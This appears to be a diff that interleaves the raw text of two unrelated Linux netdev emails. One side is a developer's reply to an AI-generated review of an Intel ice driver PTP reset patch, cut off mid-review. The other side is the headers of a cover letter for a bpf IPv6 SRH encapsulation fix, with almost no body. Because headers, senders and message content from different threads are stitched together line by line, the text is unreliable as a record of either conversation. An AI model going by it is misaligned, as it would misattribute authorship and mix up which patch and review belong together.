@@ -1,398 +1,774 @@
-Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.12])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pz2-f43.google.com (mail-pz2-f43.google.com [74.125.228.43])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8AFA54C10C4
-	for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 16:32:32 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=192.198.163.12
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789662754; cv=fail; b=Oio2k0aaGSd1Ppuy6l3trcKzsSvr+7hzQgVoTh/KaLhw1oB1f8Gwy+VoJe9hVisltggJkZ4BUM6mew//smfFghpRuOFxux0kjlVMTyCnjuqHkPYR0QmcvyGVFhTesbLVpQDC/GMVnFEVVVnCAVKk+RNes7/zFJ9AVqK/+/6cwXs=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789662754; c=relaxed/simple;
-	bh=Qi/6dKQ5ZYOUZyw55v1jZy+Qz2RbxRJ39qBMSeUKBMQ=;
-	h=Message-ID:Date:Subject:To:CC:References:From:In-Reply-To:
-	 Content-Type:MIME-Version; b=oE8PVm8nKAfzaQPW0OwW0CB5Rn8djgvnkt5QeQH2o5npr1ViyoiDxxBOP8sig9KANUqxDf8d5l9B2rqE/hJ0Om+6XRaOEF1EI6lsuALVKkqrRova7QbYl4gu79gQiOM8DJdzozPCGg4ZjnmCEd9RQUYc8VV6Tr+HeIsm9ow6QRU=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=map87Zbw; arc=fail smtp.client-ip=192.198.163.12
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EC01E5275A4
+	for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 16:34:32 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.43
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1789662875; cv=none; b=MAxU495Khd6rmsGpQUVn96eT7jXnePpJa5F8Q1G7eJFmy9XWtnkUYKIw21LrvPQYTwJpD70qf8KeTv4f58uHEc0NpC0M00ehiHMJJ0N3dHoVcG0BWGpnF5KX3wxuxXpjQEdfjXB8+oLYaPXs4maP6z+Q6nJ12+vC6Y90SHzO58k=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1789662875; c=relaxed/simple;
+	bh=/Rlx7EZtpIpGOZY1222U9yLP1u/taVM8nPgW+Jg2SH8=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=C+/a+IE1KrbCuEKwR3r02xkn1+i6L/tlw53oXd0qj2mRaac3KnuwyMulw8XPD8I1pG5iiKoKpdHHkNeo9quHtX7PLiFfWDooxqrTYcDr6lw3XMJCy+TYVvMUJjb0KLMA6N6E3mHWOakYor59zAHCuD/NKDalmF345P3glQOJAhM=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=LrKkrsvj; arc=none smtp.client-ip=74.125.228.43
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="map87Zbw"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1789662752; x=1821198752;
-  h=message-id:date:subject:to:cc:references:from:
-   in-reply-to:content-transfer-encoding:mime-version;
-  bh=Qi/6dKQ5ZYOUZyw55v1jZy+Qz2RbxRJ39qBMSeUKBMQ=;
-  b=map87ZbwzLL3O8TbZ8z3zVAlxZj1/aapyXY7TDna0+Px59iq9Afa2lOV
-   NE5+fbU4lM7vX8rfigSH67+GEdFtXB8kOalxWo+luNJQLx78zdCcLJuiY
-   yL+a/7+8xLl/RcuW5J/C/WMCgN3vTrFXWT5ACKH6ciEEDbacgu2ahdZoa
-   cb+XmLdhZ4olq0E23y/ZRrKdioDeRy1TXQoNi+JkdhphOugqkv4N7sClv
-   J18UmlHBt3SexP0nnTE8anTwoC9gDArES3vLUlC6YDlrCbjOytLOww1Dl
-   iZDNonLu2JjFmUIIniRasRcKFG/fcP+RZL2BzC9y8FJHYjapxWTXWE/UQ
-   Q==;
-X-CSE-ConnectionGUID: aMA/iBNPR8iQl2bnTSw3nQ==
-X-CSE-MsgGUID: PbNUiFDISaexA22mHD4+nw==
-X-IronPort-AV: E=McAfee;i="6800,10657,11905"; a="93935917"
-X-IronPort-AV: E=Sophos;i="6.27,103,1787036400"; 
-   d="scan'208";a="93935917"
-Received: from fmviesa002.fm.intel.com ([10.60.135.142])
-  by fmvoesa106.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 17 Sep 2026 09:32:03 -0700
-X-CSE-ConnectionGUID: c4ZNXaWFSZKCO/LjQhrSuw==
-X-CSE-MsgGUID: XrPYRRKuTKeK5faH0aOF1A==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="6.27,103,1787036400"; 
-   d="scan'208";a="297385514"
-Received: from orsmsx901.amr.corp.intel.com ([10.22.229.23])
-  by fmviesa002.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 17 Sep 2026 09:32:03 -0700
-Received: from ORSMSX903.amr.corp.intel.com (10.22.229.25) by
- ORSMSX901.amr.corp.intel.com (10.22.229.23) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.2562.46; Thu, 17 Sep 2026 09:32:02 -0700
-Received: from ORSEDG902.ED.cps.intel.com (10.7.248.12) by
- ORSMSX903.amr.corp.intel.com (10.22.229.25) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.2562.46 via Frontend Transport; Thu, 17 Sep 2026 09:32:02 -0700
-Received: from PH0PR06CU001.outbound.protection.outlook.com (40.107.208.24) by
- edgegateway.intel.com (134.134.137.112) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.2562.46; Thu, 17 Sep 2026 09:32:02 -0700
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=xESupYbVmcI8nzDMOcNCp4bbkxZUpmDYsy7uD0lHv/un5lIL3EgnVW4V+ZpHTzRsrG5FleNHMlij/je3tbUc2LScx+kKmhqiZGChkKNGXs0FicCA9u4BcOp65tH6W+vLkQBLSjc9MoFw4VgiDJC7PPoPUC8yn1eNrsRRLiNSjfYOwrCyxhqlGpGySbCv6mSonNsIsbnLDtxkzc2dG9ryd1s3KThJ/dXl72A4OZPmdIqjMU++zP7Of0RYtZDUmsPEySNiDDtncFRDwBkrmhod2V4M0Dl9XKWewFBapLHBeYC1fNnabDzOr2n6i2G6/TmLtXHOFwSWY00RGDcjgH0+Ig==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=9I1G95JniG4pIBmWa1TR2cFjyYLMygFSqK83Y8aQoes=;
- b=TVU1k0Z0GmMuK+uSKiPwgu4KmgavbugRR2oVrfCMUWI215zuuPQlTnKqhvawdYpOAyGkAe7m8DRa5A2CRgne1hVRXziQQ523t9UJ8lkPyVmULRY2q2i++CXhHaAUCjcJ1u4I8B4GcdZoleR4/kjXfblP745Z9N36np5ZKJB8daKJlt4a9cUvcw2kHdwKw+uc0tud060Vp9OZjZFFyxkEnRLwsh2V6OEetOJClhpQUjoNxgD7oglljiuflcsh2qRocc5lwzV7amnfGtvb7WQWqF4GVFwS/XzMIb+ST7J+SENdiKnSX2bDUyB9WlpUcXpwG6dwcEomaaInUH7o44lnCg==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
- dkim=pass header.d=intel.com; arc=none
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=intel.com;
-Received: from DS0PR11MB7381.namprd11.prod.outlook.com (2603:10b6:8:134::14)
- by CO1PR11MB5154.namprd11.prod.outlook.com (2603:10b6:303:99::15) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.428.13; Thu, 17 Sep
- 2026 16:31:58 +0000
-Received: from DS0PR11MB7381.namprd11.prod.outlook.com
- ([fe80::4c39:dfe6:d6dc:6f58]) by DS0PR11MB7381.namprd11.prod.outlook.com
- ([fe80::4c39:dfe6:d6dc:6f58%6]) with mapi id 15.21.0406.007; Thu, 17 Sep 2026
- 16:31:58 +0000
-Message-ID: <098b8650-1c43-41d5-b0e5-bc8d73cadfc4@intel.com>
-Date: Thu, 17 Sep 2026 09:31:56 -0700
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net 05/15] ice: E822: cancel offset verification work
- during reset preparation
-To: Jakub Kicinski <kuba@kernel.org>, <anthony.l.nguyen@intel.com>
-CC: <davem@davemloft.net>, <pabeni@redhat.com>, <edumazet@google.com>,
-	<andrew+netdev@lunn.ch>, <netdev@vger.kernel.org>,
-	<maciej.machnikowski@intel.com>, <przemyslaw.korba@intel.com>,
-	<grzegorz.nitka@intel.com>, <sergey.temerkhanov@intel.com>,
-	<arkadiusz.kubalewski@intel.com>, <poros@redhat.com>,
-	<richardcochran@gmail.com>, <horms@kernel.org>, <pmenzel@molgen.mpg.de>,
-	<aleksandr.loktionov@intel.com>, <alexander.nowlin@intel.com>
-References: <20260911003430.3386340-6-anthony.l.nguyen@intel.com>
- <20260916011216.1632452-1-kuba@kernel.org>
-From: Jacob Keller <jacob.e.keller@intel.com>
-Content-Language: en-US
-In-Reply-To: <20260916011216.1632452-1-kuba@kernel.org>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-X-ClientProxiedBy: MW4PR04CA0293.namprd04.prod.outlook.com
- (2603:10b6:303:89::28) To DS0PR11MB7381.namprd11.prod.outlook.com
- (2603:10b6:8:134::14)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="LrKkrsvj"
+Received: by mail-pz2-f43.google.com with SMTP id d2e1a72fcca58-8631d0023daso810219b3a.2
+        for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 09:34:32 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1789662872; x=1790267672; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=JzVlhARkWX8jTJRmcMM87PUzCKPtXxefJ8kmSA4dDoE=;
+        b=LrKkrsvjn18mY6fRgMrjSzg4JBvgcMVxj+nfMnataOR4J/P9ohBYYhhPE0Axq+ijC4
+         PsLUpmGUX4XdRVTKd7QbHs1IPPTb0YjD9vVHle5FsDJTGpst/zzKyVhYbXe4C6SY/plW
+         7cRmiIaBNgSEamL1X/201jtzUmkn9irIUE1oaXavSPIu3E8BHbDjSUNr6+k2yUVK+yi0
+         dSgbRGirenlH2s8MuYO7ZmQvk7eeq2UO6/x5po+dZ5/ef1r8Sj8XJvf8ZjUoAoQEjcu8
+         DLX4vtviTM0ZDuCH3WfIQ5Q+60VG6hbD9xK54h7q1fygzDUy3WSJHNxwATGPc2F6SQzt
+         qZlg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1789662872; x=1790267672;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=JzVlhARkWX8jTJRmcMM87PUzCKPtXxefJ8kmSA4dDoE=;
+        b=paMgTKoIoaO0NFMSz5fwA7hFzBwRmIScBfac59kmWCb5aoy5ZyJkdjnsVZ4dcRV/x6
+         KY6WHLkkg73udbnEXlx314JNCEm+9W/jeJSY1DvTRjmqDh26QvbJFUYnTTqf71a0Tknn
+         p54ebxE3WmQQ0eHxS9oeO/7w05DoeG8pUO/iTQHL2rvGCCOChcC2scdsmBzMm4wiVaJ1
+         y+VAYHEhQr06AGdmOAoDRwC2RVI3moeqZUo+6uwvaaYTqJu+4rWaI+/JVBHc8B1t+mrW
+         +GzUJ1zPFXTCKn+0pGV/j7taQOlVnaASY4oS3FP84zpjb+c3hMSViCX9GJ4hHssFNbbM
+         xzGQ==
+X-Forwarded-Encrypted: i=1; AKwUvBw8GI/KxgnV7D+OthhVN5YNOQhiOQL4poM3qlW+09H9a1iH1mcGT+X6jL85uvG3TjpBdFDNGq4=@vger.kernel.org
+X-Gm-Message-State: AFuF++nKCOOyXwYwWFphd2GDlFKik2L4q02fXv/i64bryigcNbXlv6i3
+	9PF5mALAgOxfTpAI94XkVA+ep1QSM0kxVkeZJ9LGOioBqPPrstkRFyJTrAwAXLwf546m
+X-Gm-Gg: AYBFou27C+On5WDNYeFqKNfAwj/zCTZ6hyV23/rpHE/4+G6EZHPqHbFZqWsbWI1HkOH
+	g6mix4C4Ng9RPrsHNgbKR9AEdinRFVwkFUozpjqUnQfVE/7SItJVr0gzNVQwZWDNx1cmrCaeCIt
+	4V7tvlfFKiC3oZiiF6MLkETvCmIRIfFPbxkvS/cg0YwSl2y43Fdys5aqmQgRih4j1rNifjTFHEu
+	hGc/X5x4rsVqFk8krSLVHQxr1O398tRQLMZxqii/5fzPyTx2OAMwV/AGvQyqdPxJUpdTUrBruKB
+	nQyrE1LeHsa0eUqJgXWwA7c8lYbTjdsWz2K93w52gk0ZNpOgt/7wvCEnuJFkcy3RAUN5M/nkexD
+	9FCDP6eUIHfI2tR29MS7kB4kALnAocWUJ9j2qTzfAjEqYG8RX/B9YlN1Bzno1LsNPKGQ35WTvsz
+	+e6Gtg4yEgsiixj7fJk4n95cXE4QK2gyvI/uoZ19d2eQ4qXfc9eEKH16pVdDarqMG6uT2CDF2pM
+	tamt5aQOQ==
+X-Received: by 2002:a05:6a00:3c86:b0:86d:c2d4:f3c0 with SMTP id d2e1a72fcca58-872376bd23bmr15058571b3a.9.1789662871947;
+        Thu, 17 Sep 2026 09:34:31 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-872024e6a39sm3240251b3a.56.2026.09.17.09.34.18
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 17 Sep 2026 09:34:31 -0700 (PDT)
+From: Ren Wei <weir@nebusec.ai>
+To: bpf@vger.kernel.org,
+	netdev@vger.kernel.org
+Cc: daniel@iogearbox.net,
+	john.fastabend@gmail.com,
+	sdf@fomichev.me,
+	martin.lau@linux.dev,
+	ast@kernel.org,
+	andrii@kernel.org,
+	eddyz87@gmail.com,
+	memxor@gmail.com,
+	song@kernel.org,
+	yonghong.song@linux.dev,
+	jolsa@kernel.org,
+	emil@etsalapatis.com,
+	ihor.solodrai@linux.dev,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	m.xhonneux@gmail.com,
+	dlebrun@google.com,
+	vega@nebusec.ai,
+	rakukuip@gmail.com,
+	weir@nebusec.ai
+Subject: [PATCH 0/1] bpf: fix TOCTOU in IPv6 SRH encapsulation
+Date: Fri, 18 Sep 2026 00:33:50 +0800
+Message-ID: <cover.1789646866.git.rakukuip@gmail.com>
+X-Mailer: git-send-email 2.53.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: DS0PR11MB7381:EE_|CO1PR11MB5154:EE_
-X-MS-Office365-Filtering-Correlation-Id: 442abe54-0af0-453c-eb65-08df14d931cd
-X-LD-Processed: 46c98d88-e344-4ed4-8496-4ed7712e255d,ExtAddr
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam: BCL:0;ARA:13230040|7416014|376014|23010399003|1800799024|366016|22082099003|18002099003|11063799006|5023799004|4143699003|56012099006|3023799007|6133799003|10067099003;
-X-Microsoft-Antispam-Message-Info: izvqHv2rOHOgInrWeQB+kml66MXo3o0iM2Lx0GZD24RwMVSKFtJRUnFmxFc6kxv9B5Pc/mZf18bts1d/e8JLQLkfNG1h7q6JKcRmH5yXFEb1DNDu8qgvvpl4qBJRJZ++BcWZSgVeLwaM/LESwJlvAoJtkEumWNC+mlhMLqRNe7kjcK0B7zHOwy/vdU4n/2aFYjm2erbkPX+3K+vGVEahD7jbz/E++wDUsnY3LRiihu+fhYB+2PH8+wOgryBtTimZdbxjhjUJU+lIqaAsambVqrWPR0MlV0xCENiUvjD+zzcFERalfG14VIY+FwXHdSXIr0URt7nnwz61IDijsoqEO7GIEb3h11YoScRhGMqCDAe/UlXgrWaHEdeYa/1wwcuNoWfCJS+ROlIzJpXEum7CxXzvwvNXbwAnMqZO8YmnNZkq0IgvBP1kLjAFOH7ODaEV4BLvxn/HK+IjGr+62SiJAQwLBV00VGEAcpkijDooE243mnbe+a2RneP19vKxWLk4oMxBhLM+A072RRCZAvv2ukMPEQlFhwh+jpFXzZugFn3YkuJVYWaD98ZocvRkBzAFLgiYU8CZcZAq93PjiV9svxkUmpGvbsHNi/JCPq82kSagYNGRbURY4KA4QnROctteU6R+ydr+OzKgNbuMmBOSpXtuJAelJeg8d2FtetG2sO4=
-X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS0PR11MB7381.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(7416014)(376014)(23010399003)(1800799024)(366016)(22082099003)(18002099003)(11063799006)(5023799004)(4143699003)(56012099006)(3023799007)(6133799003)(10067099003);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0: =?utf-8?B?aEVLYmdvSlMyVUFrNjNmZVlZTHkwYk1qTkZMR0xWQnBvdE5ZMzNkaVRPKzJF?=
- =?utf-8?B?ajlJTXFGWnhLUEZ4azNTaEN1M3VBek9QL2oyL0gxQUlIYzJCNk5peklyUVVK?=
- =?utf-8?B?NjBCbW1OU2Z2VFc1SENlNkdMSy9LTUpPeENjMkhhQlJUZUxpeHRQYUlJN3Vh?=
- =?utf-8?B?NVIyS0NZYlJoRnZpWUt6d0dYOWhPVkh6NXBOMEhKNjBsbElRQ285Y1hPSXc5?=
- =?utf-8?B?cHRWQjUyTHNRRmUyNHYxQ2NZUVZYV0pkNjJMUzlXRkMycDIvemVkcCtnVmh4?=
- =?utf-8?B?eTIzY1BlUkx5UUNWMU1RTG5SZEVNcXQ3c25mSFIvc0FHSFVTS0t1K0NvbG15?=
- =?utf-8?B?blAvZGIyNkhqOERBd3lkOHZJYW5aVkt2SnJwWDdQSklUUWIvVHljcDJCVXVp?=
- =?utf-8?B?WVBHRkxTc2pMeE12MXpoL0JhRUVUNVhyWFYreFFBaXA2YXAxV3lURU9qa2Nz?=
- =?utf-8?B?c0JHdXJSTnVyOVlEdkFpaGxGcHUxNjdyM0tHaHo3QTJMQktlM0ZKQk5sTk5K?=
- =?utf-8?B?ZUJEc09GMzJiYWRxaWRkUXpIeXZWYVcwZ1VTNHltTVFFS1dUOCtQUm5vaURY?=
- =?utf-8?B?MnVXdjFmZE1JUHA1MVA4MzdtZDdkVHptczJNazBZMWVSSkQ2RE1STmRIMU53?=
- =?utf-8?B?QkJxMHhDOE50OFcrb3gwU2ZERXU0QzFyTXlZaW5SemhpMTNNUUlaRUZUTGxO?=
- =?utf-8?B?U25sQXdjVnVxVjZhckxjT2JhZnNLZTJEazlHTk5hdE1weTlTNC9qMmk5K0VF?=
- =?utf-8?B?RncrNU9qcWtZODNLSUdnUE9FRXVPR1Y2QVNDSURnM0czNmgvRGpwUkFLNEcx?=
- =?utf-8?B?ek9CODBQMGtNcXRTWWpQTGJ3UmJYVkE5NEt4ZlRSdkJreWI5WXJpaVROSEhD?=
- =?utf-8?B?ZWRCQnZXR2drbUV0L0V2MW5FTFZhSko4MG1sSzcyd0FNY2NETWNyWDhETW94?=
- =?utf-8?B?N0R4Z0trUHloOGhDNlZ5aWZiK216VkdsbUpxeEtDK1Z2dDZYVDFtOWVQMW9s?=
- =?utf-8?B?QzNpL3UwZjNIYlVBSFFyQUR6R2k5aTZHS1N4OC9pdUE3MnAxeHVFbTNXbVJZ?=
- =?utf-8?B?dUFJemg4WE5KcmMveG80ZWZ3MFRRUUo5dHE2SWZhRlFjMlNiOGNtMzZ6S05j?=
- =?utf-8?B?Z1czKzNyYzhlUkJsZUxvQ3VVbWh5Nk9LenN1TEpYU1VnU1B1TmlxQkJIeHpl?=
- =?utf-8?B?alE5a05tNGFUWUhCSXpWQ0dZdGtvRGtYWWlSMnZRb21WTnkrUHVZR0pnWC9O?=
- =?utf-8?B?MnBwaUZ5SS95V0xFODJsZkM0LzA4WmpwWTRTYjdMTmxqb0c3NUxWUnFCU0Y4?=
- =?utf-8?B?b2x1S1lzekY1QjV2V2FVaHIvZzc2SmRRaGFic3Q5UC8xMXd5Nmx3a1lwNE15?=
- =?utf-8?B?bElXbEkramZxeElJRzVNMEQ4VDVxNHluNHY0Uk1iUklIRzF6ellwb3FEZEdJ?=
- =?utf-8?B?V253dEFmT2xhZXBHa2wwak1FZ2tKNHpxM1krcmJqbi9HTktSdm1FaUxPYmZa?=
- =?utf-8?B?d2tCUjVHQ0R0NlpaQ3VTeXhpS3NmVDN1SC9TRlQyME5reWFrK2hCd2c5ZUMr?=
- =?utf-8?B?QWxDMFVsT0wySFNRU2hCZFV5S09ZVXVncWVNeDVNZFBhRTNYRkJ4MDA4eXNL?=
- =?utf-8?B?Y1prSWhaVDE2Z3FKNFRkSlR0RHc2YlpGb1FVc1RkNzhza3pldlNRVWdiU1hP?=
- =?utf-8?B?MjNOWjQxQm43Y1lTNHA4VlhVMGpBb1BCUmhNejRDbWlzQ3U4OVozZTZOU2k3?=
- =?utf-8?B?SlB1dzJMTVp1OHdsNHhhb1Bkb1RYTjhwYVB5K0tLTTRTWGU5OHVTemlzNXor?=
- =?utf-8?B?dlFrdEJSNlc0TFQ0WUpyY3FSQ3BEN0xLT0xxKy9VaWJxNmhTSFVUS2hYcWYw?=
- =?utf-8?B?UE5yQTU1VUNqVWNES1BjVGtJdkZURFBsYVdyZi9VQWJsSlRxWDJmYUo0aFhF?=
- =?utf-8?B?a29TQWF3U1I2aHVMcWR2YmhwUGtMY28yNjZTaG0xeFBUcmhYeGU5TjFsd2xU?=
- =?utf-8?B?UFgvdFl4MFI2eVRKVmxBdG1FZlBJenptOFFMaUNPd0pLRG9XZTdXUjgyaHNW?=
- =?utf-8?B?K2kvNmtWMndzNGtEMEFRdkt3MHNTVVFOODR0MWtoeG1TeTJsUlcyNDQ4a3Nh?=
- =?utf-8?B?TDViMUhDcVFkNEl6WGpzeStyQUFJZis0VGFjNzhCNTkyL3gyWWtZSUxXZjlt?=
- =?utf-8?B?QXJqUnlmSFBiRnN6WGJpUFBoZWRMMjcxUzdxVnAwK3ZqZlpIeTNJWXZjc01P?=
- =?utf-8?B?aXZtVFczUXhzV0NsLzFHcGVreU9QeW9MRXVQZ1VWdm5iYjNSVUFJWmhqK2VM?=
- =?utf-8?B?T0tvU3RNak9ySmtFYUp0U000L2JrTFpkajBOR0EvU2tiWGcvS2V4bXYxc2I5?=
- =?utf-8?Q?QQEz1nFpbaak1PAk=3D?=
-X-Exchange-RoutingPolicyChecked: x49c81+Z+R3BdasPv0DEmBuB7LNZ2ex2tqhkP3cnyqEDi1uzHtgLb9hQRmtoYhwEAZ584+3LF1SmKK0UC9sCNpf93dr9fTbS9m3TgsAINnVhW2cGiQOzhd8/VXSZtKGHrrzQb0/VBtAMXACSF1AJ/Kjy34k064SknFxJ7m7ex3DHfXP5R50vhytYe2e4OLK11UP/mhPKBbPjepdsNLuRYKWk6q88EEVvyoy3hjFCQGoTNACNxOD/kRyQw9UnTJ8npZWy9wMXl7pNn2LF9koqNbWfw+CiDjkvptgsL/UQvtRnkQN3DdwtOlVMEBB7YyeOG0K4qvYhhzWaLmw+pVQDoQ==
-X-MS-Exchange-CrossTenant-Network-Message-Id: 442abe54-0af0-453c-eb65-08df14d931cd
-X-MS-Exchange-CrossTenant-AuthSource: DS0PR11MB7381.namprd11.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 17 Sep 2026 16:31:58.7671
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: nacEiEEvNYbw+iMeLWv3Osz2/y8sdzDrotQe9CffbMYcfaPRNmrfc3wDEQMK8vz7eX8EIkzdwvt1eyH2an8vhV/IAsxZGV2Tdiqyn43qTUo=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: CO1PR11MB5154
-X-OriginatorOrg: intel.com
+Content-Transfer-Encoding: quoted-printable
 
-On 9/15/2026 6:12 PM, Jakub Kicinski wrote:
-> This is an AI-generated review of your patch. The human sending this
-> email has considered the AI review valid, or at least plausible.
-> ---
-> ice: E822: cancel offset verification work during reset preparation
-> 
-> This adds a kthread_cancel_delayed_work_sync() of the E82x offset
-> verification work (ov_work) to ice_ptp_prepare_for_reset(), so that the
-> work does not run while the PTP reset sequence executes.  A few questions
-> about the changelog and about the placement of the new cancel.
-> 
-> First, on the described failure mechanism:
-> 
->> Without this, ice_ptp_wait_for_offsets() can execute during a reset,
->> find that ice_is_reset_in_progress() is true, and re-queue itself in a
->> tight loop. Meanwhile, the reset path in ice_ptp_rebuild_owner() calls
->> ice_ptp_port_phy_restart(), which starts a new ov_work. This results in
->> two ov_work instances running simultaneously, racing over the PHY offset
->> registers and the calibrating flag.
-> 
-> [Severity: Medium]
-> Can this sequence happen as described?  ov_work is a single
-> struct kthread_delayed_work per port (ice_ptp.h, struct ice_ptp_port) run
-> by one per-PF kworker, so the same work item cannot execute twice at once.
-> 
-> The re-queue in ice_ptp_wait_for_offsets() also does not look like a tight
-> loop, and it returns before touching the PHY offset registers or
-> port->tx.calibrating:
-> 
-> 	if (ice_is_reset_in_progress(pf->state)) {
-> 		/* wait for device driver to complete reset */
-> 		kthread_queue_delayed_work(pf->ptp.kworker,
-> 					   &port->ov_work,
-> 					   msecs_to_jiffies(100));
-> 		return;
-> 	}
-> 
-> And ice_ptp_port_phy_restart(), the only site that arms ov_work, already
-> cancel-syncs it under ps_lock before queueing again:
-> 
-> 	kthread_cancel_delayed_work_sync(&ptp_port->ov_work);
-> 	...
-> 	kthread_queue_delayed_work(pf->ptp.kworker, &ptp_port->ov_work, 0);
-> 
-> Could the changelog describe the actual window instead, for example a
-> worker instance that already passed the reset-in-progress check and is
-> mid-PHY-access when the reset starts, or one that gets re-armed after the
-> new cancel?
-> 
+From: Luxiao Xu <rakukuip@gmail.com>=0D
 
-Hm. I'll update the commit message.
-
-> Second, on the Fixes tag:
-> 
->> Fixes: 4809671015a1 ("ice: Fix E810 PTP reset flow")
-> 
-> [Severity: Medium]
-> Is this the right commit to reference?  git grep ov_work at 4809671015a1
-> under drivers/net/ethernet/intel/ice/ returns no matches, so the E82x
-> offset verification work did not exist yet at that commit, and the code
-> being changed here is the ICE_MAC_GENERIC branch of the PTP reset flow
-> rather than the E810 reset flow.  Stable tooling will use this tag to pick
-> backport targets.
-> 
-
-I'll check. I'm not sure how the original author landed on this commit.
-
-> Third, on the reference to an existing cancellation:
-> 
->> Cancel ov_work in ice_ptp_prepare_for_reset() alongside the existing
->> cancellation of the Tx tracker. The comment in the existing code already
->> documents that ov_work interference during reset is a concern but only
->> cancels it during ice_ptp_release().
-> 
-> [Severity: Medium]
